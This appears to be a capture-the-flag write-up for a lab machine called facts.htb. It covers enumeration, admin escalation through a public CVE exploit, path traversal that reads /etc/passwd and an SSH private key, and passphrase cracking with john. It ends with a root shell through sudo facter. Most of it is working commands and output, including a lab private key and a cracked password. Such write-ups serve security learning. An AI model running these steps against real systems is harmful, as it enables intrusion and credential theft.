### Nmap
```
nmap -sV -sC -vv 10.129.2.194

---OUTPUT---
Nmap scan report for 10.129.2.194
Host is up, received echo-reply ttl 63 (0.050s latency).
Scanned at 2026-02-13 10:56:49 EST for 8s
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 9.9p1 Ubuntu 3ubuntu3.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 4d:d7:b2:8c:d4:df:57:9c:a4:2f:df:c6:e3:01:29:89 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNYjzL0v+zbXt5Zvuhd63ZMVGK/8TRBsYpIitcmtFPexgvOxbFiv6VCm9ZzRBGKf0uoNaj69WYzveCNEWxdQUww=
|   256 a3:ad:6b:2f:4a:bf:6f:48:ac:81:b9:45:3f:de:fb:87 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPCNb2NXAGnDBofpLTCGLMyF/N6Xe5LIri/onyTBifIK
80/tcp open  http    syn-ack ttl 63 nginx 1.26.3 (Ubuntu)
|_http-title: Did not follow redirect to http://facts.htb/
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.26.3 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
- edit /etc/hosts to facts.htb for the corresponding IP
### Port 80
![[Pasted image 20260213105855.png]]

### Gobuster
- find admin login page `/admin`
```
gobuster dir -u http://facts.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,zip 
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://facts.htb/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Extensions:              php,txt,zip
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
index                (Status: 200) [Size: 11113]
index.txt            (Status: 500) [Size: 7918]
index.zip            (Status: 500) [Size: 7918]
index.php            (Status: 200) [Size: 11125]
search               (Status: 200) [Size: 19187]
search.php           (Status: 200) [Size: 19207]
search.txt           (Status: 500) [Size: 7918]
search.zip           (Status: 500) [Size: 7918]
rss.txt              (Status: 200) [Size: 183]
rss                  (Status: 200) [Size: 183]
rss.php              (Status: 200) [Size: 183]
rss.zip              (Status: 200) [Size: 183]
sitemap              (Status: 200) [Size: 3508]
sitemap.php          (Status: 200) [Size: 2090]
sitemap.zip          (Status: 500) [Size: 7918]
sitemap.txt          (Status: 500) [Size: 7918]
en                   (Status: 200) [Size: 11109]
en.zip               (Status: 500) [Size: 7918]
en.txt               (Status: 500) [Size: 7918]
en.php               (Status: 200) [Size: 11121]
page.txt             (Status: 500) [Size: 7918]
page.zip             (Status: 500) [Size: 7918]
page                 (Status: 200) [Size: 19593]
page.php             (Status: 200) [Size: 19613]
welcome              (Status: 200) [Size: 11966]
admin                (Status: 302) [Size: 0] [--> http://facts.htb/admin/login]
admin.txt            (Status: 302) [Size: 0] [--> http://facts.htb/admin/login]
admin.zip            (Status: 302) [Size: 0] [--> http://facts.htb/admin/login]
admin.php            (Status: 302) [Size: 0] [--> http://facts.htb/admin/login]
post.txt             (Status: 500) [Size: 7918]
post.zip             (Status: 500) [Size: 7918]
post.php             (Status: 200) [Size: 11320]
post                 (Status: 200) [Size: 11308]
```

![[Pasted image 20260213110234.png]]

- Create a new account:
![[Pasted image 20260213110323.png]]
- I logon to admin panel with credentials `test:test`
![[Pasted image 20260213110402.png]]
from this site I can escalate my user to admin role: https://github.com/predyy/CVE-2025-2304?tab=readme-ov-file

```
python3 exp.py http://facts.htb test test

---OUTPUT---
[*] Logging in as test ...
[+] Login successful
[+] Got profile page
[i] Version detected: 2.9.0 (< 2.9.1) - appears to be vulnerable version
[+] authenticity_token: ZC2VF19gM6BeaAH4bA6WEXb7s5FM0aaxBOKJBxicLoqUscBGR7SUkF8qATQ8zO-RhPWrXH5oy5mBLtWUht5rKA
http://facts.htb/admin/users/5/updated_ajax
[*] Submitting password change request
[+] Submit successful, you should be admin
```
- Logging in again I see I have more options as I am admin:
![[Pasted image 20260213110826.png]]
- I find some AWS info:
![[Pasted image 20260213111032.png]]
![[Pasted image 20260213112220.png]]

- I find CVE-2025-46987 path traversal vulnerability which has a working exploit: https://github.com/Goultarde/CVE-2024-46987
- Using this I find two users `trivia` and `william`:
```
python3 pti.py -u http://facts.htb -l test -p test /etc/passwd | grep /bin/bash
root:x:0:0:root:/root:/bin/bash
trivia:x:1000:1000:facts.htb:/home/trivia:/bin/bash
william:x:1001:1001::/home/william:/bin/bash
```
![[Pasted image 20260217052245.png]]

- I then find an ssh key for user `trivia` (from nmap I know its id_ed25519)
```
python3 pti.py -u http://facts.htb -l test -p test /home/trivia/.ssh/id_ed25519
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABAazgqAsf
PeHtKgUmcYBt1DAAAAGAAAAAEAAAAzAAAAC3NzaC1lZDI1NTE5AAAAIOx8ykFKI8kjHqRF
qjx21EjeYHd/34V8MjKmyFoD6JRxAAAAoFqA5RC3Qn8fhpT1xVan48nH82Bmoeg+FJwZeX
/RYWrW5kQruxUMp3PQbqNRTie7pgWZcgp0V9D7YH1B2yMhHhmjXjDlpULwXjZ83xVzzX4f
T4cmr9chALnVHECd6FaMS7Ygg8BOp1d9bhig+N/V7RaT4vxxlhYjLtW0/Y5SgNtN+CnLvb
0slKq3Ub64+rnmjjCz3ApznlZV8qlOP/h0j5E=
-----END OPENSSH PRIVATE KEY----
```
![[Pasted image 20260217052340.png]]

- I copy the key locally, set the required permissions and ltried to log in to the target with it but I was asked for a passphrase:
```
vi id_ed25519       # copy key here
chmod 0600 id_ed25519
ssh -i id_25519 trivia@facts.htb
```
![[Pasted image 20260217052509.png]]
- I get the hash with `ssh2john` and then crack it with `john`:
```
ssh2john id_ed25519
vi hash      # Copy hash here
john hash --wordlist=/usr/share/wordlists/rockyou.txt

---OUTPUTS---
--1--
id_ed25519:$sshng$6$16$1ace0a80b1f3de1ed2a052671806dd43$290$6f70656e7373682d6b65792d7631000000000a6165733235362d6374720000000662637279707400000018000000101ace0a80b1f3de1ed2a052671806dd430000001800000001000000330000000b7373682d6564323535313900000020ec7cca414a23c9231ea445aa3c76d448de60777fdf857c3232a6c85a03e89471000000a05a80e510b7427f1f8694f5c556a7e3c9c7f36066a1e83e149c19797fd1616ad6e6442bbb150ca773d06ea3514e27bba60599720a7457d0fb607d41db23211e19a35e30e5a542f05e367cdf1573cd7e1f4f8726afd72100b9d51c409de8568c4bb62083c04ea7577d6e18a0f8dfd5ed1693e2fc719616232ed5b4fd8e5280db4df829cbbdbd2c94aab751beb8fab9e68e30b3dc0a739e5655f2a94e3ff8748f91$24$130

--2--
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
Cost 2 (iteration count) is 24 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
dragonballz      (id_ed25519)     
1g 0:00:01:36 DONE (2026-02-17 05:21) 0.01038g/s 33.23p/s 33.23c/s 33.23C/s grecia..imissu
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```
![[Pasted image 20260217052623.png]]

- Using the cracked password `dragonballz` I log into the target:
```
ssh -i id_ed25519 trivia@facts.htb

> dragonballz
```
![[Pasted image 20260217052806.png]]

- I grab the user flag:
- ![[Pasted image 20260217052855.png]]
![[Pasted image 20260217052916.png]]

## Privilege Escalation
- Checking sudo privileges I can pass the command `/usr/bin/facter` as root:
![[Pasted image 20260217053033.png]]

Checking gtfo bins we can gain root by using this command to execute a ruby file (as this command is based on ruby)
- create a ruby file in `/tmp`
```
echo 'exec("/bin/bash")' > /tmp/root.rb
```
- Then pass the following command to execute this file as root:
```
sudo /usr/bin/facter --custom-dir=/tmp/
```
- I gain root shell
![[Pasted image 20260217084657.png]]

- I grab the root flag:
![[Pasted image 20260217084730.png]]
![[Pasted image 20260217084749.png]]